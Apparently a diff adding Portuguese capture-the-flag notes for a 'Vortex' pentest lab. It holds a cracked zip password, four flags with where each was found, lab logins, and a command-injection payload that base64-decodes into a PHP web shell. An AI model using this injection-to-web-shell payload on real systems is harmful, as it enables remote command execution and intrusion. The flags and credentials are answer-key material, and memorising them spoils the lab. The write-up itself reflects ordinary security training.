@@ -1,0 +1,44 @@
+Um arquivo foi vazado da empresa vortex e ela quer que você faça um pentest em seus 
+sistemas para ver o quanto aquele arquivo vazado pode comprometer a empresa.
+
+Alvo: IP: 172.18.6.3
+=============================================
+
+arquivo zip no trafego de rede.
+-> hash do zip quebrada com john
+---> pass:!!!secret!!!
+
+---------------------------------------------
+
+RCE concluido com sucesso!!
+-> payload "127.0.0.1 && echo PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+ | base64 -d > shell.php
+
+==========================================
+
+flags:
+
+primeira flag encontrada dentro do arquivo zip.
+-> Solyd{3xtract3d_from_pc4p}
+---------------------------------------
+segunda flag encontrada no texto da foto /wireshark
+->flag Solyd{3syr0tciph3r}
+------------------------------------------
+terçeira flag encontrada /var/www/html/.flag
+-> Solyd{c0mm4nd_1nj3ct10n_4tw}
+
+----------------------------------------------------
+
+ultima flag encontrada /root/flag
+->Solyd{sudo_sudo_always_check_sudo}
+=======================================
+
+User_pass:
+
+funcvortex:vortexdadosseguros
+---------------------------
+
+senha ssh padrão de usarios novos encontrados:
+-> /var/www/html/access/validation.php
+--->pass default: #@v0rt3x#@
+-------------------------------------------
+stdvortex:#@v0rt3x#@
